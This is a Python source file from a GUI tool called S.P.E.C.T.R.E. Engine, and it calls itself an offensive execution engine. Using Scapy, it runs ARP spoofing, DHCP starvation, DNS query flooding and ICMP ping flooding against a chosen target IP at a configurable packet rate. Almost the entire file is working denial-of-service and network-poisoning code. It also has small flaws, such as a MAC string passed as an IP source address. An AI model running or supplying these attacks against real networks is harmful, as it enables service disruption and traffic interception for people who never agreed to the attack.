# S.P.E.C.T.R.E. Engine - Licensed under AGPL-3.0
# Copyright (c) 2026 M. Sami Furqan. All rights reserved.
# See LICENSE file for full terms.

""" ""
core/l2_engine.py — Layer 2/3 Offensive Execution Engine
Runs Scapy attacks in a background thread to prevent GUI freezing.
Optimized for high packet rates and clean execution.
"""

import time
import random
from PySide6.QtCore import QThread, Signal

try:
    from scapy.all import ARP, DHCP, Ether, IP, UDP, ICMP, send, sendp, conf

    # Disable Scapy's verbose output globally to prevent terminal spam
    conf.verb = 0
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class L2Engine(QThread):
    log_signal = Signal(str, str)  # message, level
    status_signal = Signal(str)  # "STARTED", "STOPPED"

    def __init__(self, attack_type: str, target_ip: str, intensity: int, parent=None):
        super().__init__(parent)
        self.attack_type = attack_type
        self.target_ip = target_ip
        self.intensity = intensity
        self._running = False

    def run(self):
        if not SCAPY_AVAILABLE:
            self.log_signal.emit(
                "CRITICAL: Scapy not installed. Run: sudo pip install scapy", "CRIT"
            )
            return

        self._running = True
        self.status_signal.emit("STARTED")
        self.log_signal.emit(
            f"Initializing {self.attack_type} against {self.target_ip}...", "INFO"
        )

        # Map intensity (1-100) to packets per second (10 PPS to 1000 PPS)
        # This non-linear scale provides better control at low intensities
        pps = max(10, int(self.intensity * 10))
        interval = 1.0 / pps

        try:
            if "ARP" in self.attack_type:
                self._run_arp_spoof(interval)
            elif "DHCP" in self.attack_type:
                self._run_dhcp_starvation(interval)
            elif "DNS" in self.attack_type:
                self._run_dns_flood(interval)
            elif "ICMP" in self.attack_type:
                self._run_icmp_flood(interval)
        except Exception as e:
            self.log_signal.emit(f"Attack Error: {str(e)}", "CRIT")
        finally:
            self.status_signal.emit("STOPPED")
            self.log_signal.emit("Engine stopped.", "INFO")

    def stop(self):
        self._running = False
        self.wait(2000)  # Wait up to 2 seconds for thread to finish cleanly

    def _run_arp_spoof(self, interval):
        """Gratuitous ARP Flood (DoS/Poisoning)"""
        while self._running:
            try:
                rand_mac = "02:00:00:%02x:%02x:%02x" % (
                    random.randint(0, 255),
                    random.randint(0, 255),
                    random.randint(0, 255),
                )
                # Use sendp for Layer 2 sending (faster for spoofed MACs)
                pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2,
                    psrc=self.target_ip,
                    hwsrc=rand_mac,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    pdst=self.target_ip,
                )
                sendp(pkt, verbose=0)
                time.sleep(interval)
            except Exception as e:
                self.log_signal.emit(f"ARP Error: {e}", "CRIT")
                break

    def _run_dhcp_starvation(self, interval):
        """DHCP Discover Flood"""
        while self._running:
            try:
                rand_mac = "02:00:00:%02x:%02x:%02x" % (
                    random.randint(0, 255),
                    random.randint(0, 255),
                    random.randint(0, 255),
                )

                pkt = (
                    Ether(src=rand_mac, dst="ff:ff:ff:ff:ff:ff")
                    / IP(src="0.0.0.0", dst="255.255.255.255")
                    / UDP(sport=68, dport=67)
                    / DHCP(
                        options=[
                            ("message-type", "discover"),
                            ("client_id", rand_mac),
                            "end",
                        ]
                    )
                )
                sendp(pkt, verbose=0)
                time.sleep(interval)
            except Exception as e:
                self.log_signal.emit(f"DHCP Error: {e}", "CRIT")
                break

    def _run_dns_flood(self, interval):
        """DNS Query Flood (DoS)"""
        while self._running:
            try:
                rand_mac = "02:00:00:%02x:%02x:%02x" % (
                    random.randint(0, 255),
                    random.randint(0, 255),
                    random.randint(0, 255),
                )
                pkt = (
                    Ether(src=rand_mac, dst="ff:ff:ff:ff:ff:ff")
                    / IP(src=rand_mac, dst=self.target_ip)
                    / UDP(sport=random.randint(1024, 65535), dport=53)
                    / b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x05\x62\x61\x6e\x61\x6e\x61\x03\x63\x6f\x6d\x00\x00\x01\x00\x01"
                )
                sendp(pkt, verbose=0)
                time.sleep(interval)
            except Exception as e:
                self.log_signal.emit(f"DNS Error: {e}", "CRIT")
                break

    def _run_icmp_flood(self, interval):
        """ICMP Ping Flood"""
        while self._running:
            try:
                # Use send() for ICMP to allow the OS to handle routing to the target IP
                pkt = IP(dst=self.target_ip) / ICMP()
                send(pkt, verbose=0)
                time.sleep(interval)
            except Exception as e:
                self.log_signal.emit(f"ICMP Error: {e}", "CRIT")
                break
